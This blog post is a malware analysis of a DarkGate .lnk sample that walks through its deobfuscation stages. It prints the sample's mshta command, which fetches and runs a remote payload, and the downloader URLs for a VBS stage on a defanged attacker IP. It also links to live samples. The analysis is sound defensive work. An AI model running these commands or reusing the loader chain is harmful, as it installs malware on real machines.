---
title: Unmasking DarkGate: 8 Deobfuscation Layers of 1040doc_pdf.lnk
description: Reverse Engineering DarkGate sample (1040doc_pdf.lnk) and uncovering more than 8 deobfuscation layers and evasion techniques behind them.
tags: [DarkGate, malware-analysis, reverse-engineering, deobfuscation, lnk-malware]
category: Malware Analysis
date: 2025-08-10
---

Malware analysis is a critical skill and involves examining the malicious software to understand its behavior, capabilities and potential impact. Using this analysis, we can strengthen the defenses we have. This blog shows how a malware evades the defensive mechanisms by multiple layers of obfuscation. 

You can follow this blog step by step to dissect this malware and understand its mechanism.

Get your sample from Malware Bazaar: [1040doc_pdf.lnk](https://bazaar.abuse.ch/sample/ca388a52c69865829152ec89665ebdaa1b2a77dea74973352287c3a37fa1e206/)

### Step-1: Detonate and Capture behavior in a controlled sandbox

Run the `1040doc_pdf.lnk` in a sandbox environment like FlareVM or any fully isolated VM with tools like **Procmon, Wireshark** and **Process Hacker** running. Also **regshot** for before and after system changes.

Goal right now : 

- To understand what it drops or extracts.
- Capture network traffic to see which IPs are connected and where it tries to connect.

If you have learnt **SOC Analysis** then utilizing the logs can be beneficial for understanding what the malware does.

StartGreenBox

Note: Regardless of the encryption methods utilized or how deeply it is obfuscated, at the time of running it has to decrypt itself in order to run.

EndGreenBox

![image.png](DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image.png)

StartRedBox

Warning: Make sure you run malware samples in an isolated VM and take snapshots to escape the trouble of installing it again.

EndRedBox

To keep it isolated from the internet I used FakeNet by mandiant.

**Key findings:** 

- mshta.exe http://168[.]100[.]8[.]242/dc001/1040_document_pdf
- Many more findings, but lets go through them one by one in static analysis

*Now its time to do some static analysis and deobfuscation.*

### Step-2: Static Analysis and Info Gathering

Using the tool, LECmd.exe from the [Eric Zimmermen’s](https://ericzimmerman.github.io/#!index.md) tools we first try to gather the information on this `.lnk` file.

![image.png](DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%201.png)

What’s happening : - 

- The `.lnk` file calls the `SyncAppvPublishingServer.vbs (LOLBAS)`  with arguments.
- Here, it maps each numbers and subtracts it by 557 and convert to character and make a string.
- Finally the string is piped to powershell.exe

So lets decode that. The simplest option is to use python to make that string and print it.

```python
nums = [666,672,661,673,654,589,661,673,673,669,615,604,604,606,611,613,603,606,605,605,603,613,603,607,609,607,604,657,656,605,605,606,604,606,605,609,605,652,657,668,656,674,666,658,667,673,652,669,657,659]
decoded = "".join(chr(n - 557) for n in nums)
print(decoded)
```

On running the script we got : - 

```python
mshta http://168[.]100[.]8[.]242/dc001/1040_document_pdf
```

### Step-3:

I downloaded the 2nd file from [ANY.RUN](https://app.any.run/tasks/ddadd333-2ec9-45bd-8b01-4a0717a61f74). Either download from there or use your OSINT skills to find the next one. Yes, Malware Bazaar also have the other files.

We are now at the stage2 which is 1040_document_pdf file. I just renamed it to **stage2** for convenience.

After some trial and error I found out the following.

![image.png](DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%202.png)

So there are files embedded in it. Lets try to string things out. I found this, it looks like .HTA file from the opening tag. And then there was this `<script>`  tag. So I copied the entire script tags and pasted it in the browser.

In this `javascript` code there were many variables like **fc, F0** but after seeing closely you will find the one interesting `dNT` . Print that variable using browser’s console and copy the output.

![image.png](DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%203.png)

Then print the `dNT` variable. It contains another javascript code. So lets say another obfuscation.

![image.png](DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%204.png)

This code had another code in `xhY` variable and the name for the file in the `SxS`variable. Then is was going to save and run it. I remove the running part and just got the output of those two variables.

Key findings:

- Another Obfuscated Powershell code which ran on the system
- Filename as WScript.Shell

### Step-4:

In the stage4, we have the powershell code which is AES encrypted. I tweaked the code to print the output instead of directly running the encrypted code. So that way we get the decrypted powershell code.

![image.png](DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%205.png)

After printing the output we get another powershell code as follows : - 

![image.png](DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%206.png)

So I will save the above output as Stage5

StartBlueBox

Pro Tip: Using Dynamic Analysis saves time, but if you want to understand the process of the obfuscation use tools like CyberChef.

EndBlueBox

### Step-5:

Here I read the code, made it look readable from oneline. Then tried to understand the logic which was pretty simple.

![image.png](DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%207.png)

The code is basically downloading and storing files : - 

```python
http://168[.]100[.]8[.]242/dc001/1040documentpdf.vbs
http://168[.]100[.]8[.]242/dc001/AdityaAReturn2020.pdf
```

Then it saves it in the `C:\Users\{Username}\AppData\Roaming\` then executes it.

So basically its a downloader.

Now we need the `1040documentpdf.vbs`  file for the 6th Stage.

You can download from here: [Link](https://bazaar.abuse.ch/sample/4d86f191c4d7a5684116b671618669ec2bdd6bc08337fa2573c773386a14b2df/)

### Step-6:

After downloading the `.vbs` script open it. Get rid of the non-sense constants and focus of what the script is doing.

![image.png](DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%208.png)

The above code shows that its downloading yet another file which is named as **ivpzhehw** from the ip different than before.

At this stage, I tried to find out the next files online. However, I couldn’t find any of those anywhere. I don’t have the VirusTotal Enterprise so the download option was a no go. I could have easily dissected the next layers as well but as we lack the resource, so its a no go for us.

StartPurpleBox

Analysis will not always give you the results you want, the key takeaways are understanding the process of it. In this Blog, you have seen multiple obfuscations for the malware and how they have escaped the Defender. Analyzing them give you the power to write the YARA rules

EndPurpleBox

## Conclusion

DarkGate is a very slippery malware, with multiple layers of obfuscation and very high stealth. I came across a post of X by `@polygonben` and he has done the same things I have done. But an year ago and he got those files from some sources I suppose. You can check the post from [here](https://x.com/polygonben/status/1768867698845307223). There he mentioned the 8+ stages of obfuscation. However, he hasn’t completed the analysis of it as well.

I spent around 8 hours in the malware analysis and out of which 5 of them were finding the samples. As a **Reverse Engineer** I find it very easy for me to dissect these malwares. Combining my reversing skills with Threat Intelligence gave me a huge boost in this field.

If you want to learn more, connect with me on Linkedin. Simply search for [Geetansh Aditya](https://linkedin.com/in/geetansh-aditya). You can contact me through the website for any project or collaboration.

Also, a little about me, I have excellent Reverse Engineering skills but I am not limited to that, I have done Penetration Testing for companies to DFIR and everything. So feel free to reach out for any topic other than **GRC**.

**Happy Reversing and Happy Hacking!!!**

StartBlueBox

Malware Analysis in itself isn’t tough. You need to have a knack for keep going. The better you are able to understand the nature of the threat actors the more easily you can dissect their malware.

EndBlueBox
